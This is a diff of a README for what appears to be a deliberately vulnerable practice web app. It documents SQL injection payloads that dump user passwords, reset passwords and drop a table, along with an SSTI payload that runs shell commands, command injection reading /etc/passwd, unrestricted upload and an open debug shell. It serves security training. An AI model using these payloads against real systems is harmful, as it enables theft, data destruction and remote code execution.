@@ -23,10 +23,11 @@ password: ' OR 1=1--
 ```
 ' OR 1=1--
 ' UNION SELECT username,password FROM users--
-' UNION SELECT username || ':' || password,role FROM users--
+' UNION SELECT username || '~' || password,role FROM users--
 ```
-
+![SQL Injection](assets/index_sql_injection.png)
 Resources: [Sqli CheatSheet](https://book.hacktricks.xyz/pentesting-web/sql-injection)
+
 
 **SQL Fix:**
 ```
@@ -48,8 +49,9 @@ New Course', 'test', NULL, 'test.jpg'); UPDATE users SET password = 'testing' WH
 
 # Drop table
 New Course', 'test', NULL, 'test.jpg'); DROP TABLE courses CASCADE; --
-
 ```
+![SQL Injection Query](assets/add_course_sql_query.png)
+![SQL Injection Proof](assets/add_course_sql_proof.png.png)
 
 #### RCE Via SQL Injection (Postgresql)
 Path: `/add_course`
@@ -72,27 +74,29 @@ Methods: `GET, POST`
 ```
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
-
+![Server Side Template Injection](assets/course_ssti.png)
 Other resources: [SSTI Cheatsheet](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
 
 ### Command Injection
 Path: `/admin_dashboard/system_monitor`
 Methods: `GET, POST`
-
+*NOTE: Anyone can access this page. Code doesn't check for user or admin role.*
 **Examples:**
 ```
 whoami
 cat /etc/passwd
 ```
+![Command Injection](assets/command_injection.png)
 
 ### Command Injection via API endpoint
 Path: `/endpoint`
-Methods: `GET`
+Methods: `POST`
+![](assets/endpoint_script_exploit.png)
 
 **Example**
 ```
-http://127.0.0.1/endpoint?command=whoami
-curl -s http://127.0.0.1:8000/endpoint?command=cat+/etc/passwd | jq -r '.status[]'
+python3 etechacademy_script.py --target <HOST> --port <PORT> --context endpoint --cmd <CMD>
+curl -X POST http://<target>:<port>/endpoint -H "Content-Type: application/json" -d '{"command": "whoami"}'
 ```
 
 ### Unrestricted File Upload
@@ -100,3 +104,11 @@ Path: `/upload`
 Methods: `GET, POST`
 
 Can upload files to server with any extension. Once uploaded, you can execute the file it is has (*.php, .py, .sh*) extensions or delete the file.
+![Upload File](assets/upload_file.png)
+
+### Debug Shell
+Path: `/debug`
+Methods: `GET`
+
+Debug shell to execute python commands on server.
+![](assets/debug_shell.png)
